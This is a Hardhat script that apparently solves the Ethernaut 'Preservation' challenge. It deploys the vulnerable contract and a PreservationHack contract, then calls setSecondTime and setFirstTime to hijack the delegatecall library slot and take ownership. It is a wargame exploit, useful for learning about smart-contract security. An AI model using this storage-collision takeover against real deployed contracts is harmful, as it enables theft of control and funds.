import { ethers } from "hardhat";



async function main() {
  const LibraryContract = await ethers.getContractFactory("LibraryContract");
  const libraryContract1 = await LibraryContract.deploy();
  await libraryContract1.deployed();
  const libraryContract2 = await LibraryContract.deploy();
  await libraryContract2.deployed();
  console.log(`LibraryContract1 deployed to ${libraryContract1.address}`);
  console.log(`LibraryContract2 deployed to ${libraryContract2.address}`);


  const Preservation = await ethers.getContractFactory("Preservation");
  const preservation = await Preservation.deploy(libraryContract1.address, libraryContract2.address);
  await preservation.deployed();

  // const Preservation = await ethers.getContractFactory("Preservation");
  // const preservation = await Preservation.attach("0x53839913417ebc7171723489F29B9B54F49b4EEA");


  const targetContractAddress = preservation.address
  const targetContractOwner = await preservation.owner()
  console.log(`Preservation deployed to ${targetContractAddress} with owner ${targetContractOwner}`);

  const PreservationHack = await ethers.getContractFactory("PreservationHack");
  const preservationHack = await PreservationHack.deploy();
  await preservationHack.deployed();
  console.log(`PreservationHack deployed to ${preservationHack.address}`);

  console.log(`Starting to hack ${targetContractAddress}`)
  await preservation.setSecondTime(preservationHack.address);
  await preservation.setFirstTime(preservationHack.address);


  console.log(`In preservation at ${targetContractAddress} timeZone1Library is now ${await preservation.timeZone1Library()} and the owner is now ${await preservation.owner()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
